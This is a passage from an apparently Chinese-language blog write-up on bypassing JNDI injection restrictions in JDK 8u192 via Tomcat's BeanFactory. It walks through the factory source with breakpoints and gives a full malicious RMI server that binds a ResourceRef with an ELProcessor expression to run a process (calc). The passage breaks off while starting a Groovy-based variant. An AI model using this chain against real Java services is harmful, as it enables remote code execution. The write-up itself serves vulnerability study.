keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                valueArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>                                <span class="token keyword">try</span> <span class="token punctuation">{</span>                                    method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>bean<span class="token punctuation">,</span> valueArray<span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalArgumentException</span> <span class="token operator">|</span> <span class="token class-name">InvocationTargetException</span> <span class="token operator">|</span> <span class="token class-name">IllegalAccessException</span> var23<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NamingException</span><span class="token punctuation">(</span><span class="token string">"Forced String setter "</span> <span class="token operator">+</span> method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" threw exception for property "</span> <span class="token operator">+</span> propName<span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                                <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pda<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>pda<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>propName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> propType <span class="token operator">=</span> pda<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getPropertyType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                        <span class="token keyword">if</span> <span class="token punctuation">(</span>propType<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                            valueArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>                                        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>propType<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>propType<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">.</span>TYPE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>propType<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Byte</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>propType<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Byte</span><span class="token punctuation">.</span>TYPE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>propType<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Short</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>propType<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Short</span><span class="token punctuation">.</span>TYPE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>propType<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>propType<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">.</span>TYPE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>propType<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Long</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>propType<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Long</span><span class="token punctuation">.</span>TYPE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>propType<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Float</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>propType<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Float</span><span class="token punctuation">.</span>TYPE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                                                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>propType<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Double</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>propType<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Double</span><span class="token punctuation">.</span>TYPE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                                                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>propType<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Boolean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>propType<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Boolean</span><span class="token punctuation">.</span>TYPE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                                                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NamingException</span><span class="token punctuation">(</span><span class="token string">"String conversion for property "</span> <span class="token operator">+</span> propName <span class="token operator">+</span> <span class="token string">" of type '"</span> <span class="token operator">+</span> propType<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"' not available"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                    <span class="token punctuation">}</span>                                                                    valueArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token class-name">Boolean</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                                                    valueArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token class-name">Double</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                <span class="token punctuation">}</span>                                                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                                                valueArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token class-name">Float</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                            <span class="token punctuation">}</span>                                                        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                                            valueArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token class-name">Long</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                        <span class="token punctuation">}</span>                                                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                                        valueArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token punctuation">}</span>                                                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                                    valueArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token class-name">Short</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                <span class="token punctuation">}</span>                                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                                valueArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token class-name">Byte</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>                                            <span class="token punctuation">}</span>                                        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                            valueArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                        <span class="token punctuation">}</span>                                        <span class="token class-name">Method</span> setProp <span class="token operator">=</span> pda<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getWriteMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                        <span class="token keyword">if</span> <span class="token punctuation">(</span>setProp <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NamingException</span><span class="token punctuation">(</span><span class="token string">"Write not allowed for property: "</span> <span class="token operator">+</span> propName<span class="token punctuation">)</span><span class="token punctuation">;</span>                                        <span class="token punctuation">}</span>                                        setProp<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>bean<span class="token punctuation">,</span> valueArray<span class="token punctuation">)</span><span class="token punctuation">;</span>                                        <span class="token keyword">break</span><span class="token punctuation">;</span>                                    <span class="token punctuation">}</span>                                <span class="token punctuation">}</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> pda<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NamingException</span><span class="token punctuation">(</span><span class="token string">"No set method found for property: "</span> <span class="token operator">+</span> propName<span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span>                            <span class="token punctuation">}</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IntrospectionException</span> var27<span class="token punctuation">)</span> <span class="token punctuation">{</span>                ne <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NamingException</span><span class="token punctuation">(</span>var27<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                ne<span class="token punctuation">.</span><span class="token function">setRootCause</span><span class="token punctuation">(</span>var27<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">throw</span> ne<span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalAccessException</span> var28<span class="token punctuation">)</span> <span class="token punctuation">{</span>                ne <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NamingException</span><span class="token punctuation">(</span>var28<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                ne<span class="token punctuation">.</span><span class="token function">setRootCause</span><span class="token punctuation">(</span>var28<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">throw</span> ne<span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InstantiationException</span> var29<span class="token punctuation">)</span> <span class="token punctuation">{</span>                ne <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NamingException</span><span class="token punctuation">(</span>var29<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                ne<span class="token punctuation">.</span><span class="token function">setRootCause</span><span class="token punctuation">(</span>var29<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">throw</span> ne<span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvocationTargetException</span> var30<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token class-name">Throwable</span> cause <span class="token operator">=</span> var30<span class="token punctuation">.</span><span class="token function">getCause</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>cause <span class="token keyword">instanceof</span> <span class="token class-name">ThreadDeath</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">throw</span> <span class="token punctuation">(</span><span class="token class-name">ThreadDeath</span><span class="token punctuation">)</span>cause<span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>cause <span class="token keyword">instanceof</span> <span class="token class-name">VirtualMachineError</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">throw</span> <span class="token punctuation">(</span><span class="token class-name">VirtualMachineError</span><span class="token punctuation">)</span>cause<span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token class-name">NamingException</span> ne <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NamingException</span><span class="token punctuation">(</span>var30<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    ne<span class="token punctuation">.</span><span class="token function">setRootCause</span><span class="token punctuation">(</span>var30<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">throw</span> ne<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码很长，但是我们要搞清楚利用思路，就需要一点一点分析</p><p>我们在几个关键位置下断点：</p><ul><li><code>Object bean = beanClass.newInstance();</code></li><li><code>Class&lt;?&gt;[] paramTypes = new Class[]{String.class};</code></li><li><code>forced.put(param, beanClass.getMethod(propName, paramTypes));</code></li><li><code>Method method = (Method)forced.get(propName);</code></li><li><code>method.invoke(bean, valueArray);</code></li></ul><p>在代码的开头我们看到这里传入的并不是Reference，而是ResourceRef，这是一个继承了Reference的类，我们后面构造恶意RMI服务器的时候会实例化一个ResourceRef类，其中传入的参数都是我们可控的。</p><p>我们直接看第一个断点：<code>Object bean = beanClass.newInstance();</code>这里实例化了一个对象，类是beanClass，我们往上看beanClass是什么东西：<code>beanClass = tcl.loadClass(beanClassName);</code>其中的beanClassName来自于ref，也就是说beanClassName可控，导致实例化的对象bean也是可控的。</p><p>我们看第二个断点：<code>Class&lt;?&gt;[] paramTypes = new Class[]{String.class};</code>这里是对一个参数paramTypes进行了定义，要求必须是String.class类型。先埋个伏笔，后面会提到。</p><p>第三个断点：<code>forced.put(param, beanClass.getMethod(propName, paramTypes));</code>前面的forced是之前定义的一个HashMap，使用put方法放入键和值。值的类型很令人在意，是一个反射获取beanClass方法。上面我们说过，beanClass可控，paramTypes定义为String.class，propName要是可控岂不美哉。我们细看propName的来源：</p><p><code>propName&lt;----param&lt;----arr$&lt;----value&lt;----ra.getContent()&lt;----ref</code></p><p>ref可控，是不是意味着propName的值也是可控？我们看这一系列数据处理：先获取ref中forceString对应的数据赋给ra，<code>value = (String)ra.getContent();</code>再以string类型赋给value。将value的数据以逗号分割开，赋给数组arr$进行遍历：</p><p><img src="https://s2.loli.net/2022/04/02/Poy2rlGnajUXWE3.png" alt="image-20220402204207419"></p><p>进行了等号分割（ascii中61对应等号），左边的作为param，右边的作为propName。接着就是上面说的第三个断点了</p><p>第四，第五个断点我们一起来看。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Method</span> method <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Method</span><span class="token punctuation">)</span>forced<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>propName<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//第四个断点</span><span class="token keyword">if</span> <span class="token punctuation">(</span>method <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    valueArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>    method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>bean<span class="token punctuation">,</span> valueArray<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//第五个断点</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在第四个断点处获取forced中存的方法，并且在第五个断点处调用，valueArray的值同样来源于ref，可控。到这里我们可以实现调用任意一个类的任意方法，这个类\方法需要满足：</p><ul><li>是JDK自带的库或者很常见的库</li><li>因为是JavaBean，需要有一个public的无参数构造函数</li><li>只存在一个方法，只有一个参数为String.class类型（第二个断点我们埋的伏笔），且此方法可构成攻击向量</li></ul><p>又开始找了2333</p><h3 id="利用javax-el-ELProcessor-eval"><a href="#利用javax-el-ELProcessor-eval" class="headerlink" title="利用javax.el.ELProcessor#eval"></a>利用javax.el.ELProcessor#eval</h3><p>8u192 with</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span>    <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>    <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>tomcat<span class="token operator">-</span>catalina<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>    <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">8.5</span><span class="token number">.0</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span><span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span>    <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>el<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>    <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>com<span class="token punctuation">.</span>springsource<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>el<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>    <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">7.0</span><span class="token number">.26</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>javax.el.ELProcessor#eval满足我们的条件；eval方法是执行EL表达式。EL表达式借鉴于JavaScript和XPath，主要作用是在Java Web应用程序嵌入到网页（如JSP）中，用以访问页面的上下文以及不同作用域中的对象，取得对象属性的值，或执行简单的运算或判断操作。类似于PHP中的twig。我们直接构造RMI恶意服务器代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">ResourceRef</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">StringRefAddr</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HighRMIServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">{</span>        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">6666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"javax.el.ELProcessor"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"m1yuu=eval"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"m1yuu"</span><span class="token punctuation">,</span> <span class="token string">"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span>ReferenceWrapper</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"exp"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行老朋友YuanZhongClient.java，进行调试：</p><p>如图是获取到的ref对象</p><p><img src="https://s2.loli.net/2022/04/02/6aqLnYVQNr7wKuO.png" alt="image-20220402212229480"></p><p>调试到<code>beanClass = tcl.loadClass(beanClassName);</code>，这里加载了javax.el.ELProcessor类</p><p><img src="https://s2.loli.net/2022/04/02/mkqzDydFNUxu7in.png" alt="image-20220402213321763"></p><p>在<code>Object bean = beanClass.newInstance();</code>进行了实例化，获取到forceString参数对应的值，赋给ra：</p><p><img src="https://s2.loli.net/2022/04/02/ovShXzQbDrEylGw.png" alt="image-20220402213653339"></p><p>执行完<code>forced.put(param, beanClass.getMethod(propName, paramTypes));</code>后，forced结构：</p><p><img src="https://s2.loli.net/2022/04/02/ksoutTfqpBWxSnh.png" alt="image-20220402214854243"></p><p>走到第四个断点，此时method就是反射获得的<code>public java.lang.Object javax.el.ELProcessor.eval(java.lang.String)</code>，第五个断点中的参数valueArray即为EL表达式，作为<code>public java.lang.Object javax.el.ELProcessor.eval(java.lang.String)</code>方法的参数，成功执行触发漏洞。</p><h3 id="利用groovy-lang-GroovyShell-evaluate"><a href="#利用groovy-lang-GroovyShell-evaluate" class="headerlink" title="利用groovy.lang.GroovyShell#evaluate"></a>利用groovy.lang.GroovyShell#evaluate</h3><p>8u192 with</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span>    <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>    <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>tomcat<span class="token 